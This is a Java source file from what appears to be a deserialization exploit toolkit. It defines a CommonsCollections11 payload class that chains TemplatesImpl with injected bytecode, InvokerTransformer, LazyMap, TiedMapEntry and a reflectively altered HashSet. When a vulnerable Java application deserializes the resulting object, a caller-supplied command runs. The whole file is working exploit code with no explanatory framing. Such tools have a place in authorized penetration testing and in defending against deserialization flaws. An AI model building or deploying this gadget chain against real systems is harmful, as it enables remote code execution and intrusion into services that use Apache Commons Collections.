package payload;


import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import util.Reflections;
import util.Utils;

import java.io.Serializable;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CommonsCollections11 implements PayloadType {

    @Override
    public HashSet getObject(String command, Boolean flag, String... args) throws Exception {
        byte[] classBytes = Utils.getPayloadByte(command, flag, args);

        TemplatesImpl impl = new TemplatesImpl();
        Reflections.setFieldValue(impl, "_bytecodes", new byte[][]{classBytes});
        Reflections.setFieldValue(impl, "_name", "testTemplatesImpl");
        Reflections.setFieldValue(impl, "_tfactory", new TransformerFactoryImpl());

        InvokerTransformer transformer = new InvokerTransformer("asdfasdfasdf", new Class[0], new Object[0]);
        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap) LazyMap.decorate(innermap, transformer);
        TiedMapEntry tiedmap = new TiedMapEntry(map, impl);
        HashSet hashset = new HashSet(1);
        hashset.add("foo");

        HashMap hashset_map = null;
        try {
            hashset_map = (HashMap) Reflections.getFieldObject(HashSet.class, "map", hashset).get(0);
        } catch (NoSuchFieldException e) {
            hashset_map = (HashMap) Reflections.getFieldObject(HashSet.class, "backingMap", hashset).get(0);
        }

        Object[] array = null;
        try {
            array = (Object[]) Reflections.getFieldObject(HashMap.class, "table", hashset_map).get(0);
        } catch (NoSuchFieldException e) {
            array = (Object[]) Reflections.getFieldObject(HashMap.class, "elementData", hashset_map).get(0);
        }

        Object node = array[0];
        if (node == null) {
            node = array[1];
        }
        Field keyField = null;
        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception e) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node, tiedmap);

        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");


        return hashset;
    }
    }





